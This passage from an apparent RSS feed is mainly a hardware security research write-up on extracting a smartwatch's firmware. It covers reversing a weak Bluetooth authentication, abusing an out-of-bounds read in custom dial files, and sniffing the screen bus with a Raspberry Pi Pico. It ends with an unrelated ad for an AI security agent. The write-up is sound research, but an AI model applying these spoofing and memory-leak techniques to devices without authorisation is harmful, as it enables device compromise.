+           001055be [8]             0h, 5Dh, F1h, D8h,
+           001055c2 [12]           CFh,  Ch, 14h, 2Bh
+Well, it looks like we finally figured out how the  authentication data is generated!However, we needed to find an existing implementation of  to save us some time. Luckily,  wrote a Python version of this function for his BIAS research paper  and we only needed to re-use this implementation to check if the data captured in the debug output from the application matched the one produced by the recovered algorithm and its  values:When we ran this Python script, we were pleased to see that the computed value was exactly the same as the one returned by the watch!$python3auth.py
+Challenge:abb2cdc69bb454110e827441213ddc87
+EncryptedAuthdata:61721f97c869523ccce093d7f849ca02
+Expectedencryptedauthdata:61721f97c869523ccce093d7f849ca02
+JieLiauthOK!
+The use of the Bluetooth's  legacy authentication function with two hardcoded secret values turned this function into some kind of hashing function. This does not protect at all against man-in-the-middle. replay or TOCTOU attacks, as an attacker doesn't even need to know these secret values:All they need is a legitimate smartwatch to forward the challenge to and get the response from to make the target application believe any spoofed device is a legitimate one.We replicated this authentication mechanism using a Python script based on WHAD, and managed to successfully perform the handshake. We then dug into 's OTA features, but after looking for some interesting piece of code, we had to face the hard truth: there is no way to retrieve the firmware  the device through OTA!Did we reverse this authentication mechanism for nothing, just to discover afterwards that this OTA feature could not be used to extract the device's firmware? Definitely.This kind of failure happens from time to time. We were so hypnotized by the idea of getting privileged access to the device through its dedicated firmware upgrade feature, that we completely forgot to take a step back and think. We dived deep into what we thought would give us access to this piece of code we were looking for, until it failed.But in cybersecurity, we know for sure there is always a way to break in and access the information we need, even when nothing seems to work as expected. Because this is exactly when we think we may not be able to get what we want that creativity kicks in, and sometimes brings unexpected solutions to unexpected problems. In , a book written by  Michal Zalewski (who also goes by the handle ) and published in 2005, there is this cool story about an unexpected data leakage through . In 2002, Joe Loughry from Lockheed Martin Space Systems and David A. Umphress from Auburn University published a research paper entitled Information Leakage from Optical Emanations revealing that many network devices were leaking data... through their traffic monitoring LEDs. These LEDs were often called , a name coming from an old WWII joke, and most of them were simply driven by the transmit and receive data lines of such equipment. What a better way for monitoring traffic than seeing it with your own eyes? Anyone with an apparatus able to capture the light emitted by those LEDs could easily recover all data going through, no physical access required. This design weakness was present in various network equipment they discovered, and nobody thought it was a very bad design idea until this paper was published.'s OTA feature does not want to let us in? Nevermind, we will find another way to retrieve this smartwatch's firmware.We decided to focus on the watch's custom dials, as there should be some specifically formatted data we could modify, and see where that would lead us to. It took some time to find a vulnerability and determine how to exploit it, but we were not expecting this  story to be the spark that allowed us to successfully extract the watch's firmware!  We first made the hypothesis that those dials, since they seem to be animated, may contain some code to implement the logic of these animations. If there was code in dials, then it would be easy to patch one of them to get some arbitrary code executed, after guessing the main CPU's architecture. To achieve this, we needed to know how those dials are formatted and how they are indeed sent to the watch and figure out a way to abuse this feature.We managed to capture the data sent by the mobile application during an upload of a free  with  into a PCAP file, analyzed the exchanged data and noticed something familiar:  The data sent by our smartwatch through a BLE notification, , rang a bell. It was the exact same data we received from the watch when performing the OTA authentication with 's OTA Android application! A quick look at the data exchanged between the Android application and the smartwatch revealed that it was the exact same authentication mechanism used prior to upload a custom , and we were lucky to have reverse-engineered this mechanism and implemented some Python script to mimick it.Once this authentication step is performed and the application authorized by the smartwatch, the  is sent over BLE through a series of write operations performed on a specific characteristic. The first write operation specifies the number of data chunks that will follow, and the next writes transmit the dial file's content by blocks of 16 bytes. The upload process is slow as the application only sends 16 bytes of data at a time, and depending on the Bluetooth Low Energy connection's settings it may vary from one smartphone to another. The first write operation sent by the application to the watch is structured as follows:Number of chunks (big endian)Dallas 8-bit CRC, computed on previous bytesEach chunk sent after this header follows this structure:Chunk ID starting from 0 (big endian)Once the last chunk is received, the smartwatch sets the received  as its  and displays it. After having figured out how a  is sent over BLE, we wrote some Python script to extract the header and all the chunks sent by the application and saved the recovered data into a file for further analysis. We did the same for different  in order to perform a , based on the fact the more different types of  we have the easiest it would be to guess the generic structure they follow.With the few binary files collected from  sent to the smartwatch, we compared their structure and figured out their different fields and some of their meanings. Before going into the details of this structure we must warn our readers that our original hypothesis regarding these  - the fact they  contain active code executed by the smartwatch - was quickly destroyed when we had a look at the collected files. In fact, our analysis revealed that no code was required to animate those , as the animated parts were simply one of the many features supported by the smartwatch. But we kept reverse-engineering this format as parsers are generally prone to malformed data and sometimes could be abused to achieve code execution. are composed of different types of , each  describing an item to show on screen. We identified some
+of these region types during our analysis, including but not limited to:hours: displays the number of hours in a 2 digit format with a specific font.minutes: displays the number of minutes in a 2 digit format with a specific font.animated clock: renders a ticking clock, including hour and minute needles as well as the clock body.battery level: renders a graphic representation of the current battery level.simple picture: displays an image on screen.Each  has its own coordinates, width and height encoded in a dedicated header, as well as other information depending on its type (color indicating transparency, alpha channel, format of pixels in image, etc.). The example below shows how these  are defined right after a fixed header, and where the data associated with those regions is stored.We noticed an interesting characteristic in this format: the headers use offsets to locate other pieces of information that the firmware must parse to render the dial correctly. From experience, we know  that using such offsets requires strict boundary checks to avoid reading out of the dial's binary content, and these checks are sometimes poorly implemented or simply missing. We thought it might be a good first test to run against the watch, but we first needed to craft a small custom dial of our own.Our analysis of the  data format gave us a lot of information about how to create one from scratch. We decided to craft a special one to check if our understanding of both a 's format and the way it is sent over BLE were correct, with the intended goal of showing a carefully selected picture on the tiny screen of our smartwatch. If this worked as expected, then we would be able to have fun with those offsets.A standard image defined in a  can be encoded using various formats, we decided to go with the one we identified in a high quality , using an image encoded in  (64k colors). The  pixel format is pretty standard in the embedded world and especially well-known from developers that create code to draw on TFT or OLED screens. Each pixel's color is defined by the quantity of the three primary colors of light: red, green and blue. Those colors are mixed altogether based on the quantity defined for each of them to produce the required color. A 24 bits-per-pixel bitmap will encode the quantity of red, green and blue of each pixel on 8 bits each, resulting in a pixel stored on 3 bytes, or 24 bits.The  pixel format uses a different encoding based on 5 bits for red and blue and 6 bits for green, resulting in a 2-byte or 16 bits value per pixel. This format is easier to manipulate and images require less memory to be stored. We converted our carefully selected picture found on the
+Internet into its -encoded version, after having it cropped to the screen size, and created a custom region in our special dial. We generated a valid header based on this image and ended up with what looked like a valid  designed to only show our picture on screen.This script produced a custom  that we needed to upload to our smartwatch. We wrote another Python script using  that connected to the watch, performed the mandatory authentication step and eventually uploaded the dial following the format we recovered from our previous analysis. Unfortunately, our first try ended up in a timeout as it took too long to send the whole picture, and the smartwatch rejected our upload. After too much time spent investigating the matter, we found a way to speed things up by forcing  to use a very short  value when initiating a connection to our smartwatch, resulting in shorter  and therefore a faster upload speed.The final upload process is showed below (video has been edited, upload speed has been improved but is still slow):We knew at this moment that our work on reverse-engineering the  format and the associated upload process was correct, and that it was time to move on to more interesting ideas, like playing with those  we previously noticed. We decided to fuzz them a bit and see how a  with an image pointing to a bad offset would be decoded and what could be the result on screen. Targeting an  image region was the simplest thing to do, as we had a script to generate a  containing such a region and the only thing we had to change was a specific offset value. Also, targeting the pixel data of an image displayed on screen would cause the screen to show arbitrary data if by chance the offset corresponds to a valid memory address and the firmware blindly read data and transfered it to the screen.  Thomas Cougnard (also known as ), who had been following our progress so far, decided to join us and found some specific offset values that did not brick the device and led to some weird images displayed by the watch:As expected, the parser did not check if the specified offset pointed outside of the 's binary data and simply considered that was the expected image's pixel data and sent it to screen. When we saw this, we knew exactly what to do to extract this smartwatch's memory and get our hands on the firmware... This time, we had a TFT screen showing some pixels encoded using the standard  format, directly taken from the SoC's memory, instead of LEDs.A TFT screen embeds a small controller that drives a matrix of RGB LEDs, using its own temporary memory (RAM) to store the screen state and a specific protocol to allow an external system to drive the screen and set pixels at a specific rate. Thomas opted for an optical attack like the original paper, targeting the screen's LED matrix and creating a specific rig to extract data from all those LEDs (which is far more complex than what the authors of the original paper used during their research). He set up a specific rig to capture the displayed pixels and infer the data sent to the screen, but also had to play with the dial image's resolution to ease data recovery. In the meantime, Damien took another path, as TFT screens rely on well-known controllers like Sitronix's  or 's venerable , but sometimes also on different or unknown controllers that speak different , electronically speaking.  If we managed to figure out which controller was present in the smartwatch's screen and to capture the data sent by the SoC to this controller, we would had been able to capture the pixels sent to our screen and therefore to dump the content of any arbitrary memory region, like others did with those old network's cards and their LEDs but without all the issues caused by those tiny RGB LEDs and any bias introduced by a complex optical sensor.This attack was pretty simple to perform on paper, but also had some practical limitations we needed to figure out:At what speed those pixels are sent to the screen?Is it a serial or a parallel interface used by the SoC to control the screen?How are the pixels sent to the screen and in which order?There was no other way to find out than to connect a logic analyzer to the screen data lines, by soldering multiple .1mm diameter wires to the connector and analyzing the data sent back to the screen. The screen connector's pinout was unknown, so we first tried to determine how the controller was connected to the SoC, given the fact our logic analyzer was a cheap one (the best one being unavailable at this time). We managed to capture some data when sampling at 8 Ms/s, but the decoded data made no sense. This was due to the high frequency on this communication bus that left our logic analyzer way out of sync. We used a  Raspberry Pi Pico as an alternate logic analyzer, thanks to Agustín Gimenez Bernad's 100 Msps Pico-based logic analyzer project.This time, we captured the suspected data lines with a 100 Ms/s rate and successfully decoded some standard TFT screen commands supported by a wide range of controllers. In fact, the SoC uses a 25 MHz clock to drive the screen, which is pretty fast.The screen controller has been guessed from its specific device ID response sent when it receives a  command (0x04), namely a  screen controller. Once the controller known and the interface pinout and speed determined, the only thing we had to do was to decode every command related to a screen update operation and capture the data. Thomas tested different setups but failed at getting a decent optical sensor able to extract reliable data from pixels on screen. Since Damien's setup was somehow getting data that could be interpreted as valid commands, they agreed to use it to get the firmware out of the watch.We used the same Raspberry Pi Pico to capture the data sent by the main SoC to the screen because this tiny microcontroller has a lot of advantages:it can be overclocked to 200 MHz (it has officially been tested at 200 MHz and proven stable by the Raspberry Pi Foundation)it provides a pretty neat feature to perform low-level decoding called it features a more than decent amount of RAM (264 kB)its development environment and related toolchain are well-known and easy to useOur idea was to sniff the data sent to the screen with a dedicated  program, save it into RAM and then send it to our host computer once the data recovered through the Pico's serial port exposed through its USB connector. We wrote the following  program to sample a bit on the screen's serial data line each time we see a raising edge on the clock line, and bits are pushed inside an internal 32-bit shift register:Since the interface bus is clocked at 25 MHz and it takes some cycles for this PIO program to be run, we had to keep it as small as possible. In fact, this program is composed of two instructions:a  instruction waiting for a rising edge on the clock GPIO (configured as an input)a read on the data GPIO, that is then clocked in a 32-bit internal shift register In the meantime, the clock line is back to a low logic level and the next  is blocking until the next clock's rising edge. This allows sampling 32 bits from the interface bus as fast as possible, and the Pico's main program only has to wait for each 32 bits values acquired by our  program and save them in RAM:The buffer used to save data captured from the screen interface has a capacity of 145000 bytes in order to leave some memory available while allowing enough data to be collected to grab a full screen update from the main SoC. Once the buffer fills, it is sent in hexadecimal form to the host computer through its CDC ACM serial port, which is pretty fast even if virtually clocked at 115.200 bauds.On the host computer, we ran a small Python script designed to collect the data sent back by the Pico and save it as a binary blob in a target file. It was then easy to collect the data sent when a screen with a bad offset was sent to the smartwatch and displayed and investigate this data to determine how the system updates the screen.We identified a pattern that is quite common with TFT screens based on three commands used to set the  and  addresses (using respectively  and  as their command byte), followed by a command used to send the pixel data corresponding to the specified region ():We had everything we needed to capture all the pixels's data sent to screen and therefore to extract the firmware, we only needed to design a set of tools to capture portions of memory and then rebuild the whole firmware from them.First, we designed a specific header in order to quickly identify the data corresponding to the top of the screen, making it starting and ending with some magic bytes and occupy the top two lines of the screen. We also added into this header the memory address corresponding to the address of the data read by the firmware and sent to screen, based on our probable guess. We wrote a dedicated Python function to generate this:This small structure will be dumped by our tool and found at the beginning of the extracted data, allowing us to check that we did not have any bit shift based on both the defined  and trailing magic bytes , but also to recover the address associated with the captured data. This Python code was used to generate a set of valid  for successive memory addresses that were uploaded one after the other while we dumped the data sent to the screen with another python script:We managed to extract the firmware slice after slice, each slice ended up in a dedicated file. Once all the files gathered, we wrote a final script to rebuild the whole firmware in a single binary file that would allow us to analyze it and later disassemble it:And we ended up with what looked like a 2 MB firmware file that matches some regular  firmware as specified in Kagaimiq's documentation.This cheap smartwatch based on some obscure system-on-chip gave us a hard time figuring out how to extract its firmware. We could have used the official programmer sold by  but since we could not afford waiting several weeks to get our hands on it, we found an unexpected way to get
+access to the firmware by exploiting an out-of-bounds read combined with a custom rig based on a cheap Raspberry Pi Pico.It was a very good opportunity to test the limits of a Pico overclocked at 200 MHz but also to use its powerful programmable inputs/outputs () to speed things up. We could have used an expensive logic analyzer to capture screen updates and decode data from them, but in the end we found this solution easier to set up as it only requires a few lines of C and Python to implement an efficient capture rig that costs almost nothing. It also demonstrates once more that cheap hardware can often be used to achieve attacks on embedded systems, and that some old tricks used to leak data out of a system are still useful when facing recent technology!With the firmware successfully extracted from the system-on-chip's memory, the fun part could start: identifying functions in charge of measuring and showing on screen the vitals and figuring out how those values are calculated, but that's a story for another time 😉.We'd like to thank Thomas Cougnard () for his collaboration on this unexpected study of this smartwatch and for the ups and downs he went through while testing random offsets, almost bricking his watch multiple times (he eventually managed to bring it back to life). We also would like to thank  for the awesome documentation they released on their Github repository, that helped a lot to figure out how JieLi's SoCs are designed and how one can interact with them, as well as the various data formats used by most chips.]]></content:encoded></item><item><title>Empirical Analysis: Non-Linear Token Consumption in AI Security Agents</title><link>https://aliasrobotics.com/case-study-unlimited-ai-security.php</link><author>/u/Obvious-Language4462</author><category>netsec</category><pubDate>Thu, 11 Dec 2025 17:11:53 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
+              Modern AI-based security workloads are increasingly intensive, iterative, and data-driven. Professionals rely on AI agents for tasks such as log triage, vulnerability research, exploit development, incident investigation, and continuous monitoring. These workflows routinely trigger deep reasoning sequences that cannot be predicted or artificially constrained.
+            
+              In this landscape, many pay-per-use AI security tools — Competitor 1, Competitor 2, and similar metered-billing providers — rely on token-metered pricing models, forcing users to pay for every interaction and making operational costs volatile and difficult to forecast.
+            
+              As a result, users face a dilemma: either limit their own operations to control budget, or absorb unexpectedly high monthly usage costs—both of which undermine the purpose of using AI for security.
+            
+              CAI PRO addresses this fundamentally by offering unlimited usage with predictable pricing, enabling stable, uninterrupted security workflows without the volatility of consumption-based competitors.
+            Learn about Alias Robotics 🛡️ Get CAI ]]></content:encoded></item></channel></rss>
